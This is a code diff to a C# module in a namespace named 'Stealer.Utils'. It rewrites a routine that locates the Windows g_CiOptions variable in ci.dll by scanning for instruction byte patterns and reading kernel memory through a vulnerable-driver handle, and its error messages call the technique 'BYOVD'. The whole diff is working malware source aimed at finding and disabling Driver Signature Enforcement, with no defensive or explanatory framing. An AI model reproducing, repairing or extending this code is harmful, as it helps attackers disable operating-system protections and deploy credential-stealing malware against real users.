@@ -415,66 +415,71 @@ namespace Stealer.Utils
                 byte[] imageCode = new byte[sizeOfImage];
                 Marshal.Copy(userCiBase, imageCode, 0, sizeOfImage);
 
-                // Pass 1: Direct instruction scan for g_CiOptions = 6 (mov [g_CiOptions], 6)
-                for (int i = 0; i < sizeOfImage - 10; i++)
-                {
-                    if (imageCode[i] == 0xC7 && imageCode[i + 1] == 0x05 &&
-                        imageCode[i + 6] == 0x06 && imageCode[i + 7] == 0x00 &&
-                        imageCode[i + 8] == 0x00 && imageCode[i + 9] == 0x00)
-                    {
-                        int rel = BitConverter.ToInt32(imageCode, i + 2);
-                        IntPtr nextInstr = new IntPtr(userCiBase.ToInt64() + i + 10);
-                        IntPtr userTarget = new IntPtr(nextInstr.ToInt64() + rel);
-                        long offset = userTarget.ToInt64() - userCiBase.ToInt64();
-                        IntPtr cand = new IntPtr(ciKernelBase.ToInt64() + offset);
-
-                        uint val = ReadKernelMemory32WithHandle(hDev, cand);
-                        if (val == 6 || val == 0x6 || val == 0xE || val == 0x8 || (val & 6) != 0)
-                        {
-                            return cand;
-                        }
-                    }
-                }
-
-                // Pass 2: Direct instruction scan for cmp [g_CiOptions], 6 or 0
+                // Method 1: Dudka CipInitialize / CiInitialize pattern scan
+                // Search for mov [g_CiOptions], ecx/eax/r9d/r8d (89 0D, 89 05, 89 15, 89 3D, 44 89 0D, 44 89 05)
                 for (int i = 0; i < sizeOfImage - 7; i++)
                 {
-                    if (imageCode[i] == 0x83 && imageCode[i + 1] == 0x3D &&
-                        (imageCode[i + 6] == 0x06 || imageCode[i + 6] == 0x00 || imageCode[i + 6] == 0x0E))
+                    int rel = 0;
+                    IntPtr nextInstr = IntPtr.Zero;
+
+                    // 89 0D XX XX XX XX  -> mov cs:g_CiOptions, ecx
+                    // 89 05 XX XX XX XX  -> mov cs:g_CiOptions, eax
+                    // 89 15 XX XX XX XX  -> mov cs:g_CiOptions, edx
+                    if (imageCode[i] == 0x89 && (imageCode[i + 1] == 0x0D || imageCode[i + 1] == 0x05 || imageCode[i + 1] == 0x15 || imageCode[i + 1] == 0x3D))
                     {
-                        int rel = BitConverter.ToInt32(imageCode, i + 2);
-                        IntPtr nextInstr = new IntPtr(userCiBase.ToInt64() + i + 7);
+                        rel = BitConverter.ToInt32(imageCode, i + 2);
+                        nextInstr = new IntPtr(userCiBase.ToInt64() + i + 6);
+                    }
+                    // 44 89 0D XX XX XX XX -> mov cs:g_CiOptions, r9d
+                    // 44 89 05 XX XX XX XX -> mov cs:g_CiOptions, r8d
+                    else if ((imageCode[i] == 0x44 || imageCode[i] == 0x4C) && imageCode[i + 1] == 0x89 && (imageCode[i + 2] == 0x0D || imageCode[i + 2] == 0x05 || imageCode[i + 2] == 0x15))
+                    {
+                        rel = BitConverter.ToInt32(imageCode, i + 3);
+                        nextInstr = new IntPtr(userCiBase.ToInt64() + i + 7);
+                    }
+                    // C7 05 XX XX XX XX 06 00 00 00 -> mov dword ptr [g_CiOptions], 6
+                    else if (imageCode[i] == 0xC7 && imageCode[i + 1] == 0x05 && imageCode[i + 6] == 0x06 && imageCode[i + 7] == 0x00 && imageCode[i + 8] == 0x00 && imageCode[i + 9] == 0x00)
+                    {
+                        rel = BitConverter.ToInt32(imageCode, i + 2);
+                        nextInstr = new IntPtr(userCiBase.ToInt64() + i + 10);
+                    }
+
+                    if (nextInstr != IntPtr.Zero)
+                    {
                         IntPtr userTarget = new IntPtr(nextInstr.ToInt64() + rel);
                         long offset = userTarget.ToInt64() - userCiBase.ToInt64();
-                        IntPtr cand = new IntPtr(ciKernelBase.ToInt64() + offset);
 
-                        uint val = ReadKernelMemory32WithHandle(hDev, cand);
-                        if (val == 6 || val == 0x6 || val == 0xE || val == 0x8 || (val & 6) != 0)
+                        if (offset > 0 && offset < sizeOfImage + 0x40000)
                         {
-                            return cand;
+                            IntPtr cand = new IntPtr(ciKernelBase.ToInt64() + offset);
+                            uint val = ReadKernelMemory32WithHandle(hDev, cand);
+
+                            // Validate g_CiOptions flag: 6 = DSE Enabled, 8 = DSE Enabled (Win11), E = DSE Enabled (HVCI)
+                            if (val == 6 || val == 0x6 || val == 0x8 || val == 0xE || (val != 0 && (val & 6) != 0))
+                            {
+                                return cand;
+                            }
                         }
                     }
                 }
 
-                // Pass 3: Direct kernel memory range scanning for g_CiOptions == 6
-                // g_CiOptions is located in ci.dll .data section (usually offset 0x30000 - 0x60000)
-                for (long offset = 0x20000; offset < sizeOfImage + 0x10000; offset += 4)
+                // Method 2: Kernel Memory Scan fallback for any uint32 == 6 in ci.dll data range
+                for (long offset = 0x1000; offset < sizeOfImage + 0x20000; offset += 4)
                 {
                     IntPtr cand = new IntPtr(ciKernelBase.ToInt64() + offset);
                     uint val = ReadKernelMemory32WithHandle(hDev, cand);
                     if (val == 6)
                     {
-                        // Verify adjacent memory structure to avoid false positives
-                        uint prevVal = ReadKernelMemory32WithHandle(hDev, new IntPtr(cand.ToInt64() - 4));
-                        uint nextVal = ReadKernelMemory32WithHandle(hDev, new IntPtr(cand.ToInt64() + 4));
-                        if (prevVal == 0 || prevVal == 1 || nextVal == 0 || nextVal == 1)
+                        uint prev = ReadKernelMemory32WithHandle(hDev, new IntPtr(cand.ToInt64() - 4));
+                        uint next = ReadKernelMemory32WithHandle(hDev, new IntPtr(cand.ToInt64() + 4));
+                        if (prev == 0 || prev == 1 || prev == 6 || next == 0 || next == 1)
                         {
                             return cand;
                         }
                     }
                 }
 
-                errDetail = "BYOVD: Direct scans found no g_CiOptions in full ci.dll image (size=" + sizeOfImage + ", base=0x" + ciKernelBase.ToString("X") + ")";
+                errDetail = "BYOVD: Dudka scan methods found no g_CiOptions in ci.dll (size=" + sizeOfImage + ", base=0x" + ciKernelBase.ToString("X") + ")";
                 return IntPtr.Zero;
             }
             finally
